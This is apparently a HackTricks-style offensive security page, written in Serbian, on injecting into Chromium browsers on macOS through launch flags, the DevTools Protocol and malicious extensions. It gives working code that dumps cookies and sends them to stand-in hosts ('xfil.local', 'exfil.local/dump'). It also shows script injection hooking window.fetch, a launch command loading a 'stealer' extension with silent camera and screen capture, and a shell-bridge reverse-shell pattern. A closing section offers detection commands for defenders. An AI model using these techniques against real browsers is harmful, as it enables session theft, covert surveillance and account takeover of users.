# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Browseri zasnovani na Chromium-u, kao što su Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi i Opera, svi koriste iste command-line switches, preference fajlove i DevTools automation interfejse. Na macOS-u, svaki korisnik sa GUI pristupom može da prekine postojeću browser sesiju i ponovo je otvori sa proizvoljnim flagovima, ekstenzijama ili DevTools endpointima koji se izvršavaju sa entitlements ciljnog korisnika.

#### Pokretanje Chromium-a sa prilagođenim flagovima na macOS-u

macOS održava jednu UI instancu po Chromium profilu, pa instrumentation obično zahteva prisilno zatvaranje browsera (na primer pomoću `osascript -e 'tell application "Google Chrome" to quit'`). Attackers obično ponovo pokreću browser pomoću `open -na "Google Chrome" --args <flags>`, čime mogu da inject-uju argumente bez menjanja app bundle-a. Umotavanje te komande u korisnički LaunchAgent (`~/Library/LaunchAgents/*.plist`) ili login hook garantuje da će se tampered browser ponovo pokrenuti nakon reboot/logoff-a.

#### `--load-extension` Flag

`--load-extension` flag automatski učitava unpacked extensions (putanje razdvojene zarezima). Uparite ga sa `--disable-extensions-except` da biste blokirali legitimne ekstenzije, dok istovremeno primoravate samo svoj payload da se izvršava. Malicious extensions mogu zahtevati permissions sa velikim uticajem, kao što su `debugger`, `webRequest` i `cookies`, kako bi se prebacile na DevTools protokole, izmenile CSP headers, downgrade-ovale HTTPS ili exfiltrated session materijal čim se browser pokrene.<sup>[[4]](#references)</sup>

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Ovi switch-evi izlažu Chrome DevTools Protocol (CDP) preko TCP-a ili pipe-a, tako da eksterni alati mogu da upravljaju browserom. Google je uočio raširenu infostealer zloupotrebu ovog interfejsa i, počevši od Chrome-a 136 (mart 2025), switch-evi se ignorišu za podrazumevani profil osim ako je browser pokrenut sa nestandardnim `--user-data-dir`. Ovo primenjuje App-Bound Encryption na stvarne profile, ali attackers i dalje mogu da pokrenu svež profil, navedu žrtvu da se autentifikuje u njemu (phishing/triage assistance) i prikupe cookies, tokene, device trust states ili WebAuthn registrations putem CDP-a.<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

Ovaj flag preusmerava ceo browser profil (History, Cookies, Login Data, Preference fajlove itd.) na putanju pod kontrolom attackera. Obavezan je pri kombinovanju modernih Chrome build-ova sa `--remote-debugging-port`, a takođe održava tampered profil izolovanim, pa možete ubaciti unapred popunjene `Preferences` ili `Secure Preferences` fajlove koji onemogućavaju security prompts, automatski instaliraju ekstenzije i menjaju podrazumevane schemes.

#### `--use-fake-ui-for-media-stream` Flag

Ovaj switch zaobilazi permission prompt za kameru/mikrofon, tako da svaka stranica koja pozove `getUserMedia` odmah dobija pristup. Kombinujte ga sa flagovima kao što su `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` ili CDP `Browser.grantPermissions` komandama da biste nečujno snimali audio/video, delili desktop ili zadovoljili WebRTC permission provere bez interakcije korisnika.<sup>[[4]](#references)</sup>

## Obrasci isporuke i ponovnog pokretanja uočeni u praksi

CDP abuse je obično **post-exploitation** faza, a ne početni payload. Nedavna macOS kampanja usmerena na developere koristila je zatrovanu Xcode **`Run Script` build fazu** (`PBXShellScriptBuildPhase`), tako da se kod izvršavao samo kada bi žrtva **build-ovala** projekat, a ne kada bi ga samo klonirala ili otvorila. Nakon tog prvog izvršavanja, malware je takođe zarazio druga `.xcodeproj` stabla, dodao malicious Git `pre-commit` hook-ove i pretraživao ZIP arhive u potrazi za dodatnim Xcode projektima.<sup>[[3]](#references)</sup>

Za Chromium abuse ovo je važno zato što attacker ne mora da menja sam browser binary. Kratkotrajni build-phase / `osascript` stager umesto toga može da instalira **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher itd.) koji svaki put kada korisnik pokrene browser ponovo otvara legitimni browser sa flagovima pod kontrolom attackera.<sup>[[3]](#references)</sup>

> [!TIP]
> Na developerskim endpointima proverite `.pbxproj` fajlove, `.git/hooks/pre-commit` i ZIP-ove koji sadrže `.xcodeproj`, u potrazi za neočekivanim `curl`, `osascript`, `xxd`, ugnježdenim `base64` ili Chrome relaunch logikom.

## Remote Debugging i DevTools Protocol Abuse

Kada se Chrome ponovo pokrene sa namenskim `--user-data-dir` i `--remote-debugging-port`, možete da se povežete preko CDP-a (na primer pomoću `chrome-remote-interface`, `puppeteer` ili `playwright`) i skriptujete workflow-e sa visokim privilegijama:

- **Krađa cookie/session podataka:** `Network.getAllCookies` i `Storage.getCookies` vraćaju HttpOnly vrednosti čak i kada bi App-Bound encryption normalno blokirao pristup filesystem-u, zato što CDP traži od browsera koji se izvršava da ih dešifruje.
- **Menjanje permissions:** `Browser.grantPermissions` i `Emulation.setGeolocationOverride` omogućavaju zaobilaženje prompt-ova za kameru/mikrofon (posebno u kombinaciji sa `--use-fake-ui-for-media-stream`) ili falsifikovanje security provera zasnovanih na lokaciji.
- **Inject-ovanje keystrokes/script-a:** `Runtime.evaluate` izvršava proizvoljan JavaScript unutar aktivnog taba, što omogućava krađu credentials-a, menjanje DOM-a ili inject-ovanje persistence beacon-a koji preživljavaju navigation.<sup>[[1]](#references)</sup>
- **Exfiltration uživo:** `Network.webRequestWillBeSentExtraInfo` i `Fetch.enable` presreću authenticated requests/responses u realnom vremenu bez dodirivanja disk artifacts-a.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Pošto Chrome 136 blokira CDP na podrazumevanom profilu, kopiranje postojeće `~/Library/Application Support/Google/Chrome` fascikle žrtve na staging putanju više ne daje dekriptovane cookies. Umesto toga, navedite korisnika socijalnim inženjeringom da se autentifikuje unutar instrumentovanog profila (npr. „korisna“ support sesija) ili uhvatite MFA tokene tokom prenosa putem CDP-kontrolisanih mrežnih hook-ova.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Praktičan obrazac malware-a je:

1. Ponovo pokrenite userland implant ili wrapper svaki put kada se Chrome pokrene.
2. Pokrenite legitimni browser sa `--remote-debugging-port=<port>` i, na Chrome 136+, obično sa uparenim nestandardnim `--user-data-dir=<dir>`.
3. Pokrenite helper koji se povezuje na lokalni CDP WebSocket i registruje pre-document hook pomoću `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Taj helper može da ubaci JavaScript **pre** izvršavanja koda sajta, što je idealno za hook-ovanje `window.fetch`, `XMLHttpRequest`, wallet provider-a ili autofill tokova bez menjanja fajlova na disku.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Snažnija varijanta pretvara browser u **host command bridge**: injected JavaScript emituje `console.log` sa delimiter oznakom, lokalni helper prati `Runtime.consoleAPICalled`, uklanja marker, izvršava ostatak kroz host shell (na primer Go-ov `exec.Command`) i vraća stdout/stderr preko napadačevog WebSocket-a. Time se izvršavanje skripti na nivou taba unapređuje u uglavnom fileless reverse shell.<sup>[[3]](#references)</sup>

## Injection putem Extension-a kroz Debugger API

Istraživanje „Chrowned by an Extension“ iz 2023. pokazalo je da zlonamerna ekstenzija koja koristi `chrome.debugger` API može da se poveže sa bilo kojim tabom i dobije iste DevTools mogućnosti kao `--remote-debugging-port`.<sup>[[6]](#references)</sup> Time se narušavaju prvobitne pretpostavke o izolaciji (ekstenzije ostaju u svom kontekstu) i omogućava:

- Tiha krađa cookie-ja i credential-a pomoću `Network.getAllCookies`/`Fetch.getResponseBody`.
- Izmena dozvola sajtova (kamera, mikrofon, geolokacija) i zaobilaženje security interstitial-a, što phishing stranicama omogućava da se predstavljaju kao Chrome dijalozi.
- On-path tampering TLS upozorenja, download-a ili WebAuthn prompt-a programskim pozivanjem `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ili `Security.handleCertificateError`.

Učitajte ekstenziju pomoću `--load-extension`/`--disable-extensions-except` tako da nije potrebna nikakva interakcija korisnika. Minimalna background skripta koja weaponize-uje API izgleda ovako:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Ekstenzija takođe može da se pretplati na `Debugger.paused` događaje radi čitanja JavaScript promenljivih, izmene inline skripti ili dodavanja prilagođenih breakpointa koji opstaju nakon navigacije. Pošto se sve izvršava unutar korisničke GUI sesije, Gatekeeper i TCC se ne aktiviraju, što ovu tehniku čini idealnom za malware koji je već ostvario izvršavanje u korisničkom kontekstu.<sup>[[6]](#references)</sup>

## Detekcija i Hunting

- Postavite upozorenje za Chromium pregledače pokrenute sa `--remote-debugging-port`, `--remote-debugging-pipe` ili sumnjivim `--user-data-dir`, naročito kada je nadređeni proces `bash`, `sh`, `osascript`, `xcodebuild` ili LaunchAgent helper.
- Potražite kratke lance u kojima helper otvara lokalni CDP WebSocket, registruje `Page.addScriptToEvaluateOnNewDocument`, a zatim uspostavlja dugotrajnu izlaznu WebSocket/HTTPS vezu.
- Tražite mostove između konzole i shell-a korelacijom aktivnosti browsera `Runtime.consoleAPICalled` sa child shell-ovima ili helper procesima koji izvršavaju komande koje je obezbedio napadač.
- Na developerskim Mac računarima pregledajte `PBXShellScriptBuildPhase` unose u `.pbxproj` datotekama, Git `pre-commit` hooks, Dock/login item relaunchers i Xcode projekte sadržane u ZIP arhivama radi instalacije browser wrappera.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Alati

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatizuje pokretanje Chromium-a sa payload ekstenzijama i izlaže interaktivne CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Sličan alat fokusiran na presretanje saobraćaja i browser instrumentation za macOS operatere.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js biblioteka za skriptovanje Chrome DevTools Protocol dump-ova (cookies, DOM, permissions) kada je instanca sa `--remote-debugging-port` aktivna.

### Primer
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Pronađite još primera na linkovima ka alatima.

## Reference

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
